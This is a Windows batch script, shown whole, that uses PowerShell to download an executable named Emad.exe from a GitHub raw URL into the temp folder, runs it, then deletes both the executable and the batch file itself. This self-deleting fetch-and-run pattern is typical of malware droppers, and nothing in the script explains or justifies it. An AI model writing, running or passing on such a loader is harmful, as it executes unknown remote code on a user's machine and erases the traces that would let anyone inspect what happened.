@echo off
set "url=https://github.com/emad8787/panel/raw/refs/heads/main/Emad.exe"
set "destination=%TEMP%\Emad.exe"
set "batchFile=%~f0"

echo Downloading file...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"

echo Running file...
start "" /wait "%destination%"

echo Cleaning up...
del "%destination%"
(del /f /q "%batchFile%" & exit)
